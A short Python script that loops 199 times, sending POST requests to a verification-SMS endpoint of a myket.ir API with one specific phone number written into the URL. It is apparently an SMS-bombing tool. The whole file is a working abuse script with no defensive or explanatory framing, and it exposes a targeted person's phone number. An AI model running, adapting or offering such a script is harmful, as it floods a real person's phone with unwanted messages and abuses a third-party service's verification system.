import requests

url = "https://khafan.myket.ir/api/v1/khafan/send-verification/09014274059"

payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"i\"\r\n\r\ntest\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
headers = {
    'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
    'cache-control': "no-cache",
    'postman-token': "06c46068-fbcd-61d6-ad7f-6399b65001a3"
    }
i = 1
while i < 200:
  print(i)
  response = requests.request("POST", url, data=payload, headers=headers)
  print(response.text)
  i += 1


